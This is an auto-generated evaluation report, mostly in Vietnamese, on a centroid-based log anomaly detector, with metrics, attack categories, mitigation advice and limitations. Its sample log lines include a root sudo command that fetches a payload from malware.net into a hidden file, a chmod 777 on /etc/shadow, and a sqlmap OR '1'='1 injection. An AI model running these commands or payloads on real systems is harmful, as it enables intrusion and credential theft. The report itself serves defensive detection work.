# Evaluation Report: Centroid Detector

> Sinh tự động: 2026-06-12 16:21:48

## 1. Tổng quan (Overview)

| Chỉ số | Giá trị |
|---|---|
| Tổng số dòng log | 5000 |
| Số bất thường phát hiện | 133 |
| Tỷ lệ phát hiện | 2.7% |
| Accuracy | 0.9266 |
| Precision | 1.0 |
| Recall | 0.266 |
| F1 Score | 0.4202 |

## 2. Ma trận nhầm lẫn (Confusion Matrix)

| | Dự đoán Bình thường | Dự đoán Bất thường |
|---|---|---|
| **Thực tế Bình thường** | TN = 4500 | FP = 0 |
| **Thực tế Bất thường** | FN = 367 | TP = 133 |

## 3. Phân bố bất thường theo loại (Anomaly Breakdown)

| Loại bất thường | Phát hiện | Tổng trong GT | Tỷ lệ | Attack Category |
|---|---|---|---|---|
| `reverse_lookup_failure` | 56 | 56 | 100.0% | Reconnaissance |
| `suspicious_sudo` | 56 | 56 | 100.0% | Privilege Escalation |
| `sql_injection` | 14 | 55 | 25.5% | Web Application Attack / Injection |
| `service_crash` | 7 | 55 | 12.7% | Denial of Service / System Failure |

## 4. Phân tích chi tiết (Detailed Analysis)

### 4.1. `reverse_lookup_failure`

**Mô tả**: Không thể phân giải ngược DNS cho IP kết nối đến. Có thể là dấu hiệu của IP giả mạo hoặc máy chủ C&C không có PTR record.

**Phát hiện**: 56/56 (100.0%)

**Attack Category**: Reconnaissance

**Mẫu log**:

```
  [Line 4504] Unable to resolve hostname for 198.51.100.200: Name or service not known
  [Line 4513] Unable to resolve hostname for 198.51.100.200: Name or service not known
  [Line 4522] Unable to resolve hostname for 198.51.100.200: Name or service not known
```

### 4.2. `suspicious_sudo`

**Mô tả**: Lệnh sudo đáng ngờ — người dùng không có quyền (nobody, www-data) cố gắng chạy lệnh với quyền root, hoặc thực thi script từ URL độc hại.

**Phát hiện**: 56/56 (100.0%)

**Attack Category**: Privilege Escalation

**Mẫu log**:

```
  [Line 4505] nobody : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/wget http://malware.net/payload -O /tmp/.hidden
  [Line 4514] nobody : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/wget http://malware.net/payload -O /tmp/.hidden
  [Line 4523] guest : user NOT in sudoers ; TTY=pts/5 ; PWD=/home/guest ; USER=root ; COMMAND=/bin/chmod 777 /etc/shadow
```

### 4.3. `sql_injection`

**Mô tả**: SQL Injection — URL chứa cú pháp SQL (' OR '1'='1, UNION SELECT, DROP TABLE). Kẻ tấn công cố gắng khai thác lỗ hổng SQL injection.

**Phát hiện**: 14/55 (25.5%)

**Attack Category**: Web Application Attack / Injection

**Mẫu log**:

```
  [Line 4534] GET /api/users?id=1%27%20OR%20%271%27%3D%271 HTTP/1.1 500 89 "-" "sqlmap/1.6"
  [Line 4543] GET /api/users?id=1%27%20OR%20%271%27%3D%271 HTTP/1.1 500 89 "-" "sqlmap/1.6"
  [Line 4633] GET /api/users?id=1%27%20OR%20%271%27%3D%271 HTTP/1.1 500 89 "-" "sqlmap/1.6"
```

### 4.4. `service_crash`

**Mô tả**: Dịch vụ bị crash — segfault, kernel oops, NULL pointer dereference, soft lockup. Có thể do lỗi phần mềm hoặc tấn công DoS.

**Phát hiện**: 7/55 (12.7%)

**Attack Category**: Denial of Service / System Failure

**Mẫu log**:

```
  [Line 4536] systemd[1]: sshd.service: Failed with result 'signal'
  [Line 4626] systemd[1]: sshd.service: Failed with result 'signal'
  [Line 4761] systemd[1]: sshd.service: Failed with result 'signal'
```

## 5. Phân loại tấn công (Attack Classification)

| Attack Category | Số lượng | Tỷ lệ |
|---|---|
| Reconnaissance | 56 | 42.1% |
| Privilege Escalation | 56 | 42.1% |
| Web Application Attack / Injection | 14 | 10.5% |
| Denial of Service / System Failure | 7 | 5.3% |

## 6. Khuyến nghị (Recommendations)

### Với Reconnaissance

- Chặn các IP thực hiện port scan bằng iptables/nftables rules.
- Giới hạn tốc độ gói SYN (`--limit` trong iptables).
- Triển khai IDS/IPS (Snort, Suricata) để phát hiện scan pattern.
- Kiểm tra DNS PTR record — IP không có reverse DNS nên bị nghi ngờ.

### Với Privilege Escalation

- Rà soát file `/etc/sudoers` — loại bỏ quyền sudo không cần thiết.
- Không cho phép user `nobody`, `www-data` chạy sudo.
- Giám sát tất cả lệnh sudo được thực thi, đặc biệt từ user bất thường.
- Triển khai SELinux/AppArmor để giới hạn quyền process.
- Kiểm tra xem có backdoor nào được cài qua `wget`/`curl` không.

### Với Web Application Attack / Injection

- Triển khai Web Application Firewall (WAF) — ModSecurity, Cloudflare.
- Sử dụng prepared statements / parameterized queries cho database.
- Validate và sanitize tất cả user input.
- Chặn URL chứa ký tự đặc biệt (' OR, UNION, DROP, ../).
- Thực hiện penetration testing định kỳ cho web application.

### Với Denial of Service / System Failure

- Điều tra nguyên nhân root cause của crash (kernel log, core dump).
- Cập nhật kernel và phần mềm lên phiên bản mới nhất.
- Triển khai giám sát service (systemd watchdog, monit).
- Cấu hình tự động restart service khi crash (`Restart=always`).
- Kiểm tra phần cứng — soft lockup có thể do lỗi CPU/RAM.

## 7. Hạn chế (Limitations)

### Các loại bất thường bị bỏ sót hoặc phát hiện một phần

| Loại | Phát hiện | Tổng | Tỷ lệ bỏ sót |
|---|---|---|---|
| `failed_password` | 0 | 56 | 100.0% |
| `invalid_user` | 0 | 56 | 100.0% |
| `brute_force` | 0 | 56 | 100.0% |
| `port_scan` | 0 | 55 | 100.0% |
| `sql_injection` | 14 | 55 | 74.5% |
| `directory_traversal` | 0 | 55 | 100.0% |
| `service_crash` | 7 | 55 | 87.3% |

### Nguyên nhân

- Các anomaly có ngữ nghĩa gần với log bình thường (vd: `failed_password` vẫn cùng chủ đề SSH authentication với `Accepted password`) nên nằm gần centroid và không bị phát hiện.
- Centroid bị ảnh hưởng bởi số lượng lớn log bình thường trong cùng service.

### Hướng cải thiện

- Thử nghiệm với threshold thấp hơn để tăng recall.
- Kết hợp thêm đặc trưng thời gian (temporal features).
- Sử dụng model embedding chuyên biệt cho syslog thay vì MiniLM đa dụng.
- Thêm detector thứ ba (Isolation Forest, LOF) để tăng diversity.
